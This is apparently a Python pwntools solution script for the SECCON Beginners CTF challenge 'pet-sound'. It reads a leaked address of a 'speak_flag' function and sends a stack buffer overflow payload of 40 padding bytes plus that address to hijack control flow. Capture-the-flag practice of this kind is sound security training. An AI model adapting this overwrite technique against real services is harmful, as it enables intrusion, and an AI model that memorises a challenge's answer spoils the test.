from pwn import *
import re

HOST = "pet-sound.challenges.beginners.seccon.jp"
PORT = 9090
OFFSET = 40

context.endian = "little"
context.arch   = "amd64"
context.log_level = "info"

io = remote(HOST, PORT)

addr = None
addr_pat = re.compile(rb"speak_flag' is at:\s*(0x[0-9a-fA-F]+)")
while True:
    line = io.recvline(timeout=3)
    if not line:
        log.error("アドレスを含む行を受信できませんでした")
        break
    m = addr_pat.search(line)
    if m:
        addr = int(m.group(1), 16)
        log.success(f"speak_flag address = {hex(addr)}")
        break

payload = b"a" * OFFSET + p64(addr)

io.recvuntil(b"Input a new cry for Pet A >")
log.info("sending payload...")
io.sendline(payload)

io.interactive()
